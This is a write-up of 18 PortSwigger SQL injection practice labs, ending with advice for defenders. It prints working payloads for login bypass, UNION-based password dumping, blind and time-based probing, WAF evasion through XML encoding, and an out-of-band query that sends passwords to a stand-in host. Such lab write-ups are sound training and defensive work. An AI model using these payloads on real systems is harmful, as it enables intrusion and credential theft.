---
slug: "sqli-series-portswigger"
title: "The Full SQL Injection Spectrum — 18 PortSwigger Labs"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SQLi","PortSwigger Academy"]
date: "2026-08-01"
minutes: 16
visible: true
tldr: "Proves end-to-end command of SQL injection — from simple auth bypasses to blind out-of-band data exfiltration — solved and documented lab by lab on the industry-standard platform."
format: "html"
---

      <details class="flag-box"><summary><span class="flag-label">SERIES STATUS</span><span class="flag-hint"></span></summary><code>18 / 18 LABS SOLVED</code></details>

      <p>I worked through all <strong>18 SQL injection labs</strong> in the PortSwigger Web Security Academy, from Apprentice to Practitioner tier. Notes live in my <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs" target="_blank" rel="noopener">Learnings repo</a>. This report condenses the techniques each stage unlocked.</p>

      <h2>1 · Broken String Literals &amp; Login Bypass</h2>
      <p>The foundation: a single quote (<code class="inline">'</code>) causing a 500 tells you input lands unparameterized inside a SQL string. From there, authentication collapse is one line away:</p>
      <pre class="code" data-lang="sql"><code>SELECT * FROM users
WHERE username='administrator' AND password='';
-- injected password field:
' OR 1=1--</code></pre>
      <p>Detecting <em>where</em> quotes break — username vs password vs a tracking cookie — was half the lesson.</p>

      <h2>2 · UNION Attacks</h2>
      <p>Labs 7–10 teach the enumeration ritual: match the column count with incremental <code class="inline">UNION SELECT NULL,NULL,…</code>, then find a text-tolerant column, then pivot to arbitrary tables like <code class="inline">users</code>.</p>
      <pre class="code" data-lang="sql"><code>' UNION SELECT NULL, username || ':' || password FROM users--</code></pre>

      <h2>3 · Blind Injection — Asking Yes/No Questions</h2>
      <p>No error messages, no reflected data? Three escalation paths:</p>
      <ul>
        <li><strong>Conditional responses</strong> — <code class="inline">' AND SUBSTRING(password,1,1)='a'</code> against a cookie-tracked session, then bisect characters.</li>
        <li><strong>Conditional errors</strong> — forcing a divide-by-zero or type error only when a condition holds.</li>
        <li><strong>Time delays</strong> — <code class="inline">pg_sleep()</code>/<code class="inline">WAITFOR DELAY</code> when nothing observable changes at all.</li>
      </ul>

      <h2>4 · Out-of-Band Exfiltration</h2>
      <p>The Practitioner-tier finish: when the response channel is completely dead, make the database phone home via DNS:</p>
      <pre class="code" data-lang="sql"><code>'; SELECT UTL_HTTP.REQUEST('http://' || (SELECT password FROM users) || '.oob.example.net')--</code></pre>

      <h2>5 · Filter Evasion — XML Encoding</h2>
      <p>The final lab blocked classic SQL keywords at the WAF layer. Because the application parsed XML, HTML-encoding the payload (<code class="inline">&amp;#38;#35;</code>-style entities) let it decode <em>after</em> filtering — a reminder that filter placement matters as much as filter content.</p>

      <h2>Takeaways for Defenders</h2>
      <ul>
        <li>Every lab above dies instantly to parameterized queries.</li>
        <li>Error messages are free reconnaissance — suppress them.</li>
        <li>Blind channels mean monitoring must watch <em>timing and outbound DNS</em>, not just responses.</li>
      </ul>
